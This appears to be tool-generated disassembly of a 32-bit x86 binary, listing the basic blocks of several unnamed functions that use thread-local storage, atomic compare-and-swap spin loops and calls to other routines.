None
|
|
|
v
0xb11fb20:	add	dword ptr [ebp - 0x20], eax
0xb11fb23:	mov	ecx, edi
0xb11fb25:	mov	eax, dword ptr [ebp - 0x24]
0xb11fb28:	cmp	dword ptr [ebp - 0x20], eax
0xb11fb2b:	jb	0xb11fa8c
None
|
|
|
v
0xb11fa38:	mov	edi, dword ptr [eax + 4]
0xb11fa3b:	add	eax, 8
0xb11fa3e:	add	edi, edx
0xb11fa40:	cmp	eax, ecx
0xb11fa42:	mov	edx, edi
0xb11fa44:	jne	0xb11fa38
None
|
|
|
v
0xb11fb15:	mov	ecx, esi
0xb11fb17:	jmp	0xb11fac9
None
|
|
|
v
0xb11fad8:	mov	ecx, eax
0xb11fada:	mov	eax, edx
0xb11fadc:	cmp	eax, 0xb
0xb11fadf:	jne	0xb11fa4d
None
|
|
|
v
0xb11fa7f:	mov	ecx, dword ptr [ebp - 0x24]
0xb11fa82:	mov	dword ptr [ebp - 0x24], edi
0xb11fa85:	mov	esi, ecx
0xb11fa87:	mov	dword ptr [ebp - 0x20], ecx
0xb11fa8a:	mov	ecx, eax
0xb11fa8c:	mov	eax, dword ptr [ecx + 4]
0xb11fa8f:	cmp	eax, esi
0xb11fa91:	jbe	0xb11faf0
None
|
|
|
v
0xb11fb10:	cmp	eax, 0xb
0xb11fb13:	je	0xb11fb5c
None
|
|
|
v
0xb11fa0e:	cmp	eax, 0
0xb11fa11:	mov	ecx, eax
0xb11fa13:	jle	0xb11fb33
None
|
|
|
v
0xb11fa93:	add	dword ptr [ecx], esi
0xb11fa95:	sub	eax, esi
0xb11fa97:	mov	edi, ecx
0xb11fa99:	mov	dword ptr [ecx + 4], eax
0xb11fa9c:	mov	eax, dword ptr [ebp + 0x10]
0xb11fa9f:	mov	dword ptr [esp + 4], edi
0xb11faa3:	mov	dword ptr [esp + 8], eax
0xb11faa7:	mov	eax, dword ptr [ebp + 8]
0xb11faaa:	mov	dword ptr [esp], eax
0xb11faad:	call	0xb0e3130
None
|
|
|
v
0xb11fa46:	mov	ecx, dword ptr [ebp - 0x1c]
0xb11fa49:	cmp	ecx, edi
0xb11fa4b:	jb	0xb11fa58
None
|
|
|
v
0xb11fb33:	je	0xb11fa4d
None
|
|
|
v
0xb11fafb:	mov	eax, dword ptr [ebx - 0xdc]
0xb11fb01:	mov	edx, dword ptr gs:[0]
0xb11fb08:	mov	eax, dword ptr [edx + eax]
0xb11fb0b:	cmp	eax, 4
0xb11fb0e:	je	0xb11fa9c
None
|
|
|
v
0xb11fb39:	mov	eax, dword ptr [ebx - 0xdc]
0xb11fb3f:	mov	edx, dword ptr gs:[0]
0xb11fb46:	mov	eax, dword ptr [edx + eax]
0xb11fb49:	jmp	0xb11fadc
None
|
|
|
v
0xb11fb69:	test	eax, eax
0xb11fb6b:	jg	0xb11fa9c
None
|
|
|
v
0xb11fadc:	cmp	eax, 0xb
0xb11fadf:	jne	0xb11fa4d
None
|
|
|
v
0xb11fac6:	mov	ecx, dword ptr [ebp - 0x20]
0xb11fac9:	mov	esp, dword ptr [ebp - 0x1c]
0xb11facc:	lea	esp, dword ptr [ebp - 0xc]
0xb11facf:	mov	eax, ecx
0xb11fad1:	pop	ebx
0xb11fad2:	pop	esi
0xb11fad3:	pop	edi
0xb11fad4:	pop	ebp
0xb11fad5:	ret	
None
|
|
|
v
0xb11f9c0:	push	ebp
0xb11f9c1:	mov	ebp, esp
0xb11f9c3:	push	edi
0xb11f9c4:	push	esi
0xb11f9c5:	push	ebx
0xb11f9c6:	call	0xb1267db
None
|
|
|
v
0xb11f9f3:	mov	eax, dword ptr [ebp + 0x10]
0xb11f9f6:	mov	dword ptr [esp + 4], esi
0xb11f9fa:	mov	dword ptr [esp + 8], eax
0xb11f9fe:	mov	eax, dword ptr [ebp + 8]
0xb11fa01:	mov	dword ptr [esp], eax
0xb11fa04:	call	0xb0e3130
None
|
|
|
v
0xb11fb5c:	mov	eax, dword ptr [ebp + 8]
0xb11fb5f:	mov	edx, 0xc8
0xb11fb64:	call	0xb11f4c0
None
|
|
|
v
0xb11fa09:	cmp	eax, 0xff
0xb11fa0c:	je	0xb11f9e0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b11fb80
TOTAL BLOCKS :7
0xb11fbe4:	lea	esi, dword ptr [esi]
0xb11fbea:	lea	edi, dword ptr [edi]
None
|
|
|
v
0xb11fb80:	push	esi
0xb11fb81:	push	ebx
0xb11fb82:	sub	esp, 0x14
0xb11fb85:	mov	esi, dword ptr [esp + 0x20]
0xb11fb89:	call	0xb1267db
None
|
|
|
v
0xb11fb8e:	add	ebx, 0x8b472
0xb11fb94:	mov	eax, dword ptr [esi + 0xc]
0xb11fb97:	test	eax, eax
0xb11fb99:	jne	0xb11fbba
None
|
|
|
v
0xb11fb9b:	mov	eax, dword ptr [esi + 8]
0xb11fb9e:	mov	dword ptr [esp + 4], eax
0xb11fba2:	mov	eax, dword ptr [esi]
0xb11fba4:	mov	dword ptr [esp], eax
0xb11fba7:	call	0xb0e7410
None
|
|
|
v
0xb11fbb4:	add	esp, 0x14
0xb11fbb7:	pop	ebx
0xb11fbb8:	pop	esi
0xb11fbb9:	ret	
None
|
|
|
v
0xb11fbba:	lea	eax, dword ptr [ebx - 0x46fd0]
0xb11fbc0:	mov	dword ptr [esp + 0xc], eax
0xb11fbc4:	lea	eax, dword ptr [ebx - 0x46ff3]
0xb11fbca:	mov	dword ptr [esp + 4], eax
0xb11fbce:	lea	eax, dword ptr [ebx - 0x46fe5]
0xb11fbd4:	mov	dword ptr [esp + 8], 0x110
0xb11fbdc:	mov	dword ptr [esp], eax
0xb11fbdf:	call	0xb027820
None
|
|
|
v
0xb11fbac:	mov	dword ptr [esp], esi
0xb11fbaf:	call	0xb017470
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b11fbf0
TOTAL BLOCKS :60
0xb11fc6a:	mov	eax, dword ptr [ebp - 0xd8]
0xb11fc70:	mov	dword ptr [ebp - 0xb0], esi
0xb11fc76:	lea	esi, dword ptr [ebp - 0x94]
0xb11fc7c:	mov	dword ptr [ebp - 0xa8], 8
0xb11fc86:	mov	dword ptr [ebp - 0xb4], eax
0xb11fc8c:	lea	eax, dword ptr [ebp - 0xc0]
0xb11fc92:	mov	dword ptr [ebp - 0xac], eax
0xb11fc98:	xor	eax, eax
0xb11fc9a:	mov	dword ptr [esi + eax], 0
0xb11fca1:	add	eax, 4
0xb11fca4:	cmp	eax, 0x1c
0xb11fca7:	jb	0xb11fc9a
None
|
|
|
v
0xb11fd91:	test	eax, eax
0xb11fd93:	jne	0xb11ff31
None
|
|
|
v
0xb11fc19:	mov	edx, dword ptr [ebx - 0xdc]
0xb11fc1f:	mov	edx, dword ptr [edi + edx]
0xb11fc22:	lea	esi, dword ptr [eax + 1]
0xb11fc25:	mov	dword ptr [ebp - 0xe4], eax
0xb11fc2b:	add	eax, 0x10
0xb11fc2e:	and	eax, 0xfffffff0
0xb11fc31:	sub	esp, eax
0xb11fc33:	lea	eax, dword ptr [esp + 0x18]
0xb11fc37:	mov	dword ptr [ebp - 0xd0], edx
0xb11fc3d:	mov	edx, dword ptr [ebp + 0xc]
0xb11fc40:	mov	dword ptr [ebp - 0xd8], eax
0xb11fc46:	mov	eax, dword ptr [ebp + 8]
0xb11fc49:	mov	dword ptr [esp], esi
0xb11fc4c:	mov	dword ptr [ebp - 0xe0], esi
0xb11fc52:	call	0xb11f5d0
None
|
|
|
v
0xb11ffc9:	mov	edx, dword ptr [ebp - 0xd4]
0xb11ffcf:	mov	ecx, eax
0xb11ffd1:	mov	eax, dword ptr [ebp - 0xd8]
0xb11ffd7:	mov	dword ptr [ebp - 0xe0], ecx
0xb11ffdd:	add	eax, 0x12c
0xb11ffe2:	mov	dword ptr [ebp - 0xd8], eax
0xb11ffe8:	mov	eax, ecx
0xb11ffea:	adc	edx, 0
0xb11ffed:	sar	eax, 0x1f
0xb11fff0:	mov	dword ptr [ebp - 0xdc], eax
0xb11fff6:	mov	eax, dword ptr [ebp - 0xdc]
0xb11fffc:	mov	dword ptr [ebp - 0xd4], edx
0xb120002:	cmp	dword ptr [ebp - 0xd4], eax
0xb120008:	jb	0xb12001c
None
|
|
|
v
0xb11fd99:	lea	eax, dword ptr [ebp - 0x78]
0xb11fd9c:	mov	dword ptr [esp + 8], eax
0xb11fda0:	mov	eax, dword ptr [ebp - 0xe8]
0xb11fda6:	mov	dword ptr [esp], 3
0xb11fdad:	mov	dword ptr [esp + 4], eax
0xb11fdb1:	call	0xb0da2f0
None
|
|
|
v
0xb11fe29:	je	0xb11fe38
None
|
|
|
v
0xb11fe56:	mov	edx, dword ptr [ebp - 0xe4]
0xb11fe5c:	add	edx, 9
0xb11fe5f:	cmp	eax, edx
0xb11fe61:	jne	0xb11ff31
None
|
|
|
v
0xb11fe84:	mov	eax, dword ptr [ebp - 0xe8]
0xb11fe8a:	mov	dword ptr [esp + 0x14], 0
0xb11fe92:	mov	dword ptr [esp + 0xc], 1
0xb11fe9a:	mov	dword ptr [esp + 8], 1
0xb11fea2:	mov	dword ptr [esp + 0x10], eax
0xb11fea6:	mov	eax, dword ptr [ebp - 0xc0]
0xb11feac:	mov	dword ptr [esp], 0
0xb11feb3:	mov	dword ptr [esp + 4], eax
0xb11feb7:	call	0xb0e7320
None
|
|
|
v
0xb11fdcd:	jle	0xb120027
None
|
|
|
v
0xb11fd24:	mov	eax, dword ptr [ebp - 0xcc]
0xb11fd2a:	mov	dword ptr [esp + 8], 0x40000000
0xb11fd32:	mov	dword ptr [esp + 4], esi
0xb11fd36:	mov	dword ptr [esp], eax
0xb11fd39:	call	0xb0ed770
None
|
|
|
v
0xb11ff5a:	mov	eax, dword ptr [ebp - 0xec]
0xb11ff60:	cmp	dword ptr [ebp - 0xd8], eax
0xb11ff66:	ja	0xb11ff1f
None
|
|
|
v
0xb11fec3:	cmp	dword ptr [eax], 2
0xb11fec6:	jne	0xb12001c
None
|
|
|
v
0xb11fdb6:	test	eax, eax
0xb11fdb8:	jne	0xb11ff31
None
|
|
|
v
0xb11ff4c:	mov	edx, dword ptr [ebp - 0xd8]
0xb11ff52:	jmp	0xb11fded
None
|
|
|
v
0xb11fd64:	mov	edx, dword ptr [ebp - 0x98]
0xb11fd6a:	cmp	dword ptr [ebp - 0xe0], eax
0xb11fd70:	mov	dword ptr [ebp - 0xe8], edx
0xb11fd76:	jne	0xb11fe56
None
|
|
|
v
0xb11fed6:	mov	eax, dword ptr [eax + 0x28]
0xb11fed9:	test	eax, eax
0xb11fedb:	je	0xb12001c
None
|
|
|
v
0xb11fdbe:	mov	eax, dword ptr [ebp - 0x48]
0xb11fdc1:	mov	edx, dword ptr [ebp - 0x4c]
0xb11fdc4:	cmp	eax, 0
0xb11fdc7:	jl	0xb11ff31
None
|
|
|
v
0xb11fded:	mov	eax, dword ptr [ebp - 0xcc]
0xb11fdf3:	mov	dword ptr [ebp - 0xd8], edx
0xb11fdf9:	mov	dword ptr [esp], eax
0xb11fdfc:	call	0xb0db860
None
|
|
|
v
0xb11fe07:	mov	eax, dword ptr [ebx - 0xdc]
0xb11fe0d:	mov	ecx, dword ptr [ebp - 0xd0]
0xb11fe13:	mov	dword ptr [edi + eax], ecx
0xb11fe16:	mov	eax, dword ptr [ebp + 0x10]
0xb11fe19:	mov	edi, dword ptr [ebp + 0x10]
0xb11fe1c:	mov	eax, dword ptr [eax]
0xb11fe1e:	mov	dword ptr [edi], edx
0xb11fe20:	test	eax, eax
0xb11fe22:	je	0xb11fe2b
None
|
|
|
v
0xb11fbf0:	push	ebp
0xb11fbf1:	mov	ebp, esp
0xb11fbf3:	push	edi
0xb11fbf4:	mov	edi, dword ptr gs:[0]
0xb11fbfb:	push	esi
0xb11fbfc:	push	ebx
0xb11fbfd:	call	0xb1267db
None
|
|
|
v
0xb11fd0a:	test	eax, eax
0xb11fd0c:	jg	0xb11fd24
None
|
|
|
v
0xb11fde8:	mov	edx, 0xffffffff
0xb11fded:	mov	eax, dword ptr [ebp - 0xcc]
0xb11fdf3:	mov	dword ptr [ebp - 0xd8], edx
0xb11fdf9:	mov	dword ptr [esp], eax
0xb11fdfc:	call	0xb0db860
None
|
|
|
v
0xb11fc57:	mov	edx, 0xffffffff
0xb11fc5c:	test	eax, eax
0xb11fc5e:	mov	dword ptr [ebp - 0xcc], eax
0xb11fc64:	js	0xb11fe07
None
|
|
|
v
0xb11fd5b:	cmp	dword ptr [edx], 0x10
0xb11fd5e:	jne	0xb11fde8
None
|
|
|
v
0xb11fd0e:	jmp	0xb11fde8
None
|
|
|
v
0xb11fee1:	mov	edx, dword ptr [esi + 0xc]
0xb11fee4:	test	edx, edx
0xb11fee6:	je	0xb11ffab
None
|
|
|
v
0xb11fd4d:	mov	edx, dword ptr [ebp - 0x84]
0xb11fd53:	test	edx, edx
0xb11fd55:	je	0xb11fde8
None
|
|
|
v
0xb120014:	mov	eax, dword ptr [esi + 0x28]
0xb120017:	jmp	0xb11feec
None
|
|
|
v
0xb12000c:	cmp	dword ptr [ebp - 0xd8], ecx
0xb120012:	jb	0xb12001c
None
|
|
|
v
0xb12000a:	ja	0xb120014
None
|
|
|
v
0xb11feec:	mov	edx, dword ptr [ebp - 0xc0]
0xb11fef2:	lea	ecx, dword ptr [eax*4 + 0xf]
0xb11fef9:	mov	eax, dword ptr [esi + 0x2c]
0xb11fefc:	and	ecx, 0xfffffff0
0xb11feff:	mov	dword ptr [ebp - 0xec], edx
0xb11ff05:	xor	edx, edx
0xb11ff07:	cmp	edx, dword ptr [ebp - 0xbc]
0xb11ff0d:	mov	dword ptr [ebp - 0xe0], eax
0xb11ff13:	lea	eax, dword ptr [ecx + eax + 0x78]
0xb11ff17:	mov	dword ptr [ebp - 0xd8], eax
0xb11ff1d:	jbe	0xb11ff58
None
|
|
|
v
0xb11fc02:	add	ebx, 0x8b3fe
0xb11fc08:	sub	esp, 0xfc
0xb11fc0e:	mov	eax, dword ptr [ebp + 0xc]
0xb11fc11:	mov	dword ptr [esp], eax
0xb11fc14:	call	0xb07ae80
None
|
|
|
v
0xb11ff58:	jb	0xb11ff68
None
|
|
|
v
0xb11fe46:	mov	edx, dword ptr [ebp - 0xcc]
0xb11fe4c:	lea	esp, dword ptr [ebp - 0xc]
0xb11fe4f:	pop	ebx
0xb11fe50:	pop	esi
0xb11fe51:	pop	edi
0xb11fe52:	mov	eax, edx
0xb11fe54:	pop	ebp
0xb11fe55:	ret	
None
|
|
|
v
0xb11fc9a:	mov	dword ptr [esi + eax], 0
0xb11fca1:	add	eax, 4
0xb11fca4:	cmp	eax, 0x1c
0xb11fca7:	jb	0xb11fc9a
None
|
|
|
v
0xb11fe2b:	lea	esp, dword ptr [ebp - 0xc]
0xb11fe2e:	mov	eax, edx
0xb11fe30:	pop	ebx
0xb11fe31:	pop	esi
0xb11fe32:	pop	edi
0xb11fe33:	pop	ebp
0xb11fe34:	ret	
None
|
|
|
v
0xb11fdd3:	mov	dword ptr [ebp - 0xc0], edx
0xb11fdd9:	mov	dword ptr [ebp - 0xbc], eax
0xb11fddf:	jmp	0xb11fe84
None
|
|
|
v
0xb11fca9:	lea	eax, dword ptr [ebp - 0xb4]
0xb11fcaf:	mov	edx, 0x1388
0xb11fcb4:	mov	dword ptr [ebp - 0x8c], eax
0xb11fcba:	lea	eax, dword ptr [ebp - 0xa4]
0xb11fcc0:	mov	dword ptr [ebp - 0x84], eax
0xb11fcc6:	mov	eax, dword ptr [ebp - 0xcc]
0xb11fccc:	mov	dword ptr [ebp - 0x88], 2
0xb11fcd6:	mov	dword ptr [ebp - 0x80], 0x10
0xb11fcdd:	mov	dword ptr [ebp - 0xa0], 1
0xb11fce7:	mov	dword ptr [ebp - 0x9c], 1
0xb11fcf1:	mov	dword ptr [ebp - 0xa4], 0x10
0xb11fcfb:	mov	dword ptr [ebp - 0x98], 0xffffffff
0xb11fd05:	call	0xb11f4c0
None
|
|
|
v
0xb11ff25:	mov	dword ptr [esp + 4], eax
0xb11ff29:	mov	dword ptr [esp], esi
0xb11ff2c:	call	0xb0e7410
None
|
|
|
v
0xb11fd7c:	mov	eax, dword ptr [ebp + 0xc]
0xb11fd7f:	mov	dword ptr [esp + 4], eax
0xb11fd83:	mov	eax, dword ptr [ebp - 0xd8]
0xb11fd89:	mov	dword ptr [esp], eax
0xb11fd8c:	call	0xb07a740
None
|
|
|
v
0xb11fe38:	mov	dword ptr [esp], eax
0xb11fe3b:	mov	dword ptr [ebp - 0xcc], edx
0xb11fe41:	call	0xb11fb80
None
|
|
|
v
0xb11fe67:	mov	eax, dword ptr [ebp + 0xc]
0xb11fe6a:	mov	dword ptr [esp + 4], eax
0xb11fe6e:	mov	eax, dword ptr [ebp - 0xd8]
0xb11fe74:	mov	dword ptr [esp], eax
0xb11fe77:	call	0xb07a740
None
|
|
|
v
0xb11ff68:	mov	dword ptr [esp], 0x14
0xb11ff6f:	mov	dword ptr [ebp - 0xe4], ecx
0xb11ff75:	call	0xb0173f0
None
|
|
|
v
0xb11fd3e:	cmp	eax, 0xff
0xb11fd41:	je	0xb11fd18
None
|
|
|
v
0xb11ff38:	mov	eax, dword ptr [ebp - 0xe8]
0xb11ff3e:	mov	dword ptr [ebp - 0xd8], edx
0xb11ff44:	mov	dword ptr [esp], eax
0xb11ff47:	call	0xb0db860
None
|
|
|
v
0xb120030:	jmp	0xb11fdd3
None
|
|
|
v
0xb11fe01:	mov	edx, dword ptr [ebp - 0xd8]
0xb11fe07:	mov	eax, dword ptr [ebx - 0xdc]
0xb11fe0d:	mov	ecx, dword ptr [ebp - 0xd0]
0xb11fe13:	mov	dword ptr [edi + eax], ecx
0xb11fe16:	mov	eax, dword ptr [ebp + 0x10]
0xb11fe19:	mov	edi, dword ptr [ebp + 0x10]
0xb11fe1c:	mov	eax, dword ptr [eax]
0xb11fe1e:	mov	dword ptr [edi], edx
0xb11fe20:	test	eax, eax
0xb11fe22:	je	0xb11fe2b
None
|
|
|
v
0xb11ffab:	mov	eax, dword ptr [esi + 0x10]
0xb11ffae:	mov	edx, dword ptr [esi + 0x14]
0xb11ffb1:	mov	dword ptr [esp], 0
0xb11ffb8:	mov	dword ptr [ebp - 0xd8], eax
0xb11ffbe:	mov	dword ptr [ebp - 0xd4], edx
0xb11ffc4:	call	0xb0a6b80
None
|
|
|
v
0xb12001c:	mov	eax, dword ptr [ebp - 0xc0]
0xb120022:	jmp	0xb11ff25
None
|
|
|
v
0xb11ff1f:	mov	eax, dword ptr [ebp - 0xec]
0xb11ff25:	mov	dword ptr [esp + 4], eax
0xb11ff29:	mov	dword ptr [esp], esi
0xb11ff2c:	call	0xb0e7410
None
|
|
|
v
0xb11fe24:	lock sub	dword ptr [eax + 0xc], 1
None
|
|
|
v
0xb11fd43:	cmp	dword ptr [ebp - 0x80], 0xb
0xb11fd47:	jbe	0xb11fde8
None
|
|
|
v
0xb11ff7a:	test	eax, eax
0xb11ff7c:	mov	edx, eax
0xb11ff7e:	je	0xb11ff1f
None
|
|
|
v
0xb11ff80:	mov	ecx, dword ptr [ebp - 0xe4]
0xb11ff86:	add	ecx, dword ptr [esi + 4]
0xb11ff89:	mov	dword ptr [eax], esi
0xb11ff8b:	add	esi, ecx
0xb11ff8d:	mov	dword ptr [eax + 4], esi
0xb11ff90:	mov	eax, dword ptr [ebp - 0xd8]
0xb11ff96:	mov	dword ptr [edx + 0xc], 1
0xb11ff9d:	mov	dword ptr [edx + 8], eax
0xb11ffa0:	mov	eax, dword ptr [ebp - 0xe0]
0xb11ffa6:	mov	dword ptr [edx + 0x10], eax
0xb11ffa9:	jmp	0xb11ff38
None
|
|
|
v
0xb11fe7c:	test	eax, eax
0xb11fe7e:	jne	0xb11ff31
None
|
|
|
v
0xb11fd18:	mov	ecx, dword ptr [ebx - 0xdc]
0xb11fd1e:	cmp	dword ptr [edi + ecx], 4
0xb11fd22:	jne	0xb11fd43
None
|
|
|
v
0xb11fecc:	cmp	dword ptr [eax + 4], 0x78
0xb11fed0:	jne	0xb12001c
None
|
|
|
v
0xb11febc:	cmp	eax, 0xff
0xb11febf:	mov	esi, eax
0xb11fec1:	je	0xb11ff31
None
|
|
|
v
0xb11ff31:	mov	edx, 0xffffffff
0xb11ff36:	nop	
0xb11ff38:	mov	eax, dword ptr [ebp - 0xe8]
0xb11ff3e:	mov	dword ptr [ebp - 0xd8], edx
0xb11ff44:	mov	dword ptr [esp], eax
0xb11ff47:	call	0xb0db860
None
|
|
|
v
0xb120027:	cmp	edx, 0x77
0xb12002a:	jbe	0xb11ff31
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b120040
TOTAL BLOCKS :22
0xb120040:	push	ebp
0xb120041:	push	edi
0xb120042:	push	esi
0xb120043:	sub	esp, 0x10
0xb120046:	mov	edx, dword ptr [esp + 0x28]
0xb12004a:	mov	eax, dword ptr [edx + 4]
0xb12004d:	cmp	eax, 0xff
0xb120050:	je	0xb120128
None
|
|
|
v
0xb12014d:	pause	
None
|
|
|
v
0xb120128:	add	esp, 0x10
0xb12012b:	mov	eax, 0xffffffff
0xb120130:	pop	esi
0xb120131:	pop	edi
0xb120132:	pop	ebp
0xb120133:	ret	
None
|
|
|
v
0xb120080:	mov	eax, dword ptr [ebp]
0xb120083:	mov	ecx, dword ptr [eax + 0xc]
0xb120086:	test	ecx, ecx
0xb120088:	je	0xb1200b8
None
|
|
|
v
0xb120140:	or	ebp, 0xffffffff
0xb120143:	jmp	0xb1200a7
None
|
|
|
v
0xb1200a3:	lock inc	dword ptr [ebp + 0xc]
None
|
|
|
v
0xb1200e6:	cmp	esi, eax
0xb1200e8:	jae	0xb120138
None
|
|
|
v
0xb120138:	mov	eax, dword ptr [ebp]
0xb12013b:	jmp	0xb12008a
None
|
|
|
v
0xb12010f:	mov	edx, dword ptr [esp + 0xc]
0xb120113:	cmp	eax, 0xff
0xb120116:	mov	ebp, eax
0xb120118:	je	0xb120140
None
|
|
|
v
0xb12011a:	mov	eax, dword ptr [eax]
0xb12011c:	jmp	0xb120092
None
|
|
|
v
0xb1200e4:	ja	0xb120138
None
|
|
|
v
0xb120070:	mov	ebp, dword ptr [edx + 4]
0xb120073:	cmp	ebp, 0xff
0xb120076:	je	0xb120140
None
|
|
|
v
0xb1200a7:	mov	dword ptr [edx], 0
0xb1200ad:	add	esp, 0x10
0xb1200b0:	mov	eax, ebp
0xb1200b2:	pop	esi
0xb1200b3:	pop	edi
0xb1200b4:	pop	ebp
0xb1200b5:	ret	
None
|
|
|
v
0xb1200f0:	lea	eax, dword ptr [edx + 4]
0xb1200f3:	mov	dword ptr [esp + 8], eax
0xb1200f7:	mov	eax, dword ptr [esp + 0x24]
0xb1200fb:	mov	dword ptr [esp + 0xc], edx
0xb1200ff:	mov	dword ptr [esp + 4], eax
0xb120103:	mov	eax, dword ptr [esp + 0x20]
0xb120107:	mov	dword ptr [esp], eax
0xb12010a:	call	0xb11fbf0
None
|
|
|
v
0xb12008a:	mov	esi, dword ptr [ebp + 0x10]
0xb12008d:	cmp	dword ptr [eax + 0x2c], esi
0xb120090:	ja	0xb1200f0
None
|
|
|
v
0xb120056:	mov	edi, 6
0xb12005b:	xor	ecx, ecx
0xb12005d:	mov	esi, 1
0xb120062:	mov	eax, ecx
0xb120064:	lock cmpxchg	dword ptr [edx], esi
0xb120068:	test	eax, eax
0xb12006a:	jne	0xb120148
None
|
|
|
v
0xb120092:	mov	eax, dword ptr [eax + 8]
0xb120095:	mov	ecx, dword ptr [esp + 0x2c]
0xb120099:	test	al, 1
0xb12009b:	mov	dword ptr [ecx], eax
0xb12009d:	jne	0xb120140
None
|
|
|
v
0xb1200b8:	mov	esi, dword ptr [eax + 0x10]
0xb1200bb:	mov	edi, dword ptr [eax + 0x14]
0xb1200be:	mov	dword ptr [esp], 0
0xb1200c5:	mov	dword ptr [esp + 0xc], edx
0xb1200c9:	call	0xb0a6b80
None
|
|
|
v
0xb120148:	sub	edi, 1
0xb12014b:	je	0xb120128
None
|
|
|
v
0xb1200ce:	add	esi, 0x12c
0xb1200d4:	mov	edx, dword ptr [esp + 0xc]
0xb1200d8:	adc	edi, 0
0xb1200db:	mov	ecx, eax
0xb1200dd:	sar	ecx, 0x1f
0xb1200e0:	cmp	edi, ecx
0xb1200e2:	jb	0xb1200f0
None
|
|
|
v
0xb12007c:	test	ebp, ebp
0xb12007e:	je	0xb1200f0
None
|
|
|
v
0xb1200ea:	lea	esi, dword ptr [esi]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b120160
TOTAL BLOCKS :24
0xb1202ad:	add	ecx, dword ptr [esp + 0x1c]
0xb1202b1:	cmp	dword ptr [esp + 0x14], ecx
0xb1202b5:	jb	0xb1201e0
None
|
|
|
v
0xb120243:	mov	eax, dword ptr [esp + 0x48]
0xb120247:	cmp	dword ptr [edi + 4], eax
0xb12024a:	jne	0xb1201e0
None
|
|
|
v
0xb1201ed:	cmp	dword ptr [esp + 0x10], -1
0xb1201f2:	je	0xb1202c0
None
|
|
|
v
0xb12024c:	mov	ecx, dword ptr [esp + 0x48]
0xb120250:	mov	eax, dword ptr [edi + 8]
0xb120253:	add	ecx, eax
0xb120255:	cmp	dword ptr [esp + 0x14], ecx
0xb120259:	jb	0xb1201e0
None
|
|
|
v
0xb120236:	add	edi, dword ptr [esp + 0x18]
0xb12023a:	movzx	eax, byte ptr [edi]
0xb12023d:	cmp	eax, dword ptr [esp + 0x40]
0xb120241:	jne	0xb1201e0
None
|
|
|
v
0xb120224:	sub	dword ptr [esp + 0x10], 1
0xb120229:	add	eax, 0x1c
0xb12022c:	cmp	dword ptr [esp + 0x14], eax
0xb120230:	jb	0xb1202c0
None
|
|
|
v
0xb1201be:	mov	eax, dword ptr [edi + 4]
0xb1201c1:	sub	edx, 1
0xb1201c4:	mov	edi, esi
0xb1201c6:	xor	ebp, ebp
0xb1201c8:	mov	dword ptr [esp + 0x10], edx
0xb1201cc:	mov	dword ptr [esp + 0x18], eax
0xb1201d0:	mov	eax, dword ptr [esp + 0x50]
0xb1201d4:	add	eax, 0x18
0xb1201d7:	mov	dword ptr [esp + 0x1c], eax
0xb1201db:	jmp	0xb120236
None
|
|
|
v
0xb120170:	add	ebx, 0x8ae90
0xb120176:	mov	edi, dword ptr [esp + 0x4c]
0xb12017a:	mov	dword ptr [esp + 4], eax
0xb12017e:	mov	eax, dword ptr [esp + 0x44]
0xb120182:	mov	dword ptr [esp], eax
0xb120185:	call	0xb11c720
None
|
|
|
v
0xb1202c2:	add	esp, 0x2c
0xb1202c5:	pop	ebx
0xb1202c6:	pop	esi
0xb1202c7:	pop	edi
0xb1202c8:	pop	ebp
0xb1202c9:	ret	
None
|
|
|
v
0xb1202bb:	jmp	0xb1202c2
None
|
|
|
v
0xb1201b3:	lea	eax, dword ptr [esi + 0x1c]
0xb1201b6:	cmp	ebp, eax
0xb1201b8:	jb	0xb1202c0
None
|
|
|
v
0xb1201e0:	mov	eax, dword ptr [edi + 0x10]
0xb1201e3:	cmp	esi, eax
0xb1201e5:	mov	edi, eax
0xb1201e7:	je	0xb1202c0
None
|
|
|
v
0xb12027f:	mov	ecx, dword ptr [edi + 0x14]
0xb120282:	lea	eax, dword ptr [ecx + 0x18]
0xb120285:	cmp	dword ptr [esp + 0x14], eax
0xb120289:	jb	0xb1201e0
None
|
|
|
v
0xb1202c0:	xor	eax, eax
0xb1202c2:	add	esp, 0x2c
0xb1202c5:	pop	ebx
0xb1202c6:	pop	esi
0xb1202c7:	pop	edi
0xb1202c8:	pop	ebp
0xb1202c9:	ret	
None
|
|
|
v
0xb12018a:	mov	edx, dword ptr [edi + 0x10]
0xb12018d:	mov	ecx, dword ptr [edi]
0xb12018f:	mov	ebp, edx
0xb120191:	mov	dword ptr [esp + 0x14], edx
0xb120195:	xor	edx, edx
0xb120197:	div	dword ptr [ecx + 0x28]
0xb12019a:	mov	eax, ebp
0xb12019c:	mov	esi, dword ptr [ecx + edx*4 + 0x78]
0xb1201a0:	mov	edx, 0xcccccccd
0xb1201a5:	mul	edx
0xb1201a7:	shr	edx, 5
0xb1201aa:	cmp	esi, 0xff
0xb1201ad:	je	0xb1202c0
None
|
|
|
v
0xb12025b:	add	eax, dword ptr [esp + 0x18]
0xb12025f:	mov	edx, dword ptr [esp + 0x48]
0xb120263:	mov	dword ptr [esp + 4], eax
0xb120267:	mov	eax, dword ptr [esp + 0x44]
0xb12026b:	mov	dword ptr [esp + 8], edx
0xb12026f:	mov	dword ptr [esp], eax
0xb120272:	call	0xb07c620
None
|
|
|
v
0xb12029f:	mov	edx, dword ptr [eax]
0xb1202a1:	add	edx, ecx
0xb1202a3:	cmp	dword ptr [esp + 0x14], edx
0xb1202a7:	jb	0xb1201e0
None
|
|
|
v
0xb12020f:	mov	esi, dword ptr [ecx + 0x10]
0xb120212:	mov	ecx, 1
0xb120217:	sub	ecx, ebp
0xb120219:	cmp	eax, 0xff
0xb12021c:	mov	ebp, ecx
0xb12021e:	je	0xb1202c0
None
|
|
|
v
0xb120277:	test	eax, eax
0xb120279:	jne	0xb1201e0
None
|
|
|
v
0xb1201f8:	test	ebp, ebp
0xb1201fa:	je	0xb120212
None
|
|
|
v
0xb120160:	push	ebp
0xb120161:	push	edi
0xb120162:	push	esi
0xb120163:	push	ebx
0xb120164:	sub	esp, 0x2c
0xb120167:	mov	eax, dword ptr [esp + 0x48]
0xb12016b:	call	0xb1267db
None
|
|
|
v
0xb120212:	mov	ecx, 1
0xb120217:	sub	ecx, ebp
0xb120219:	cmp	eax, 0xff
0xb12021c:	mov	ebp, ecx
0xb12021e:	je	0xb1202c0
None
|
